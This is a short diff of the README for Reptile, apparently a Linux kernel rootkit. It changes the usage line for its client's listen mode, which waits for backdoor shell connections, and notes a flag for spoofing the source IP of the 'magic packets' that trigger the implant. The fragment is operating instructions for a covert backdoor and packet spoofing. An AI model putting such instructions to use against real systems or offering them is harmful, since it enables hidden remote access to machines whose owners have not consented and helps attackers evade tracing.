@@ -26,6 +26,6 @@ This shell is a user-mode-helper called by Reptile Kernel Module when is trigger
 ```
 - To just stay listening connections:
 ```
-./reptile_client -t <target IP> -x listen -l <your IP> -p <your port>
+./reptile_client -x listen -p <your port>
 ```
 - If you wanna spoof the source IP address of magic packets, use: `-s <spoof IP>`
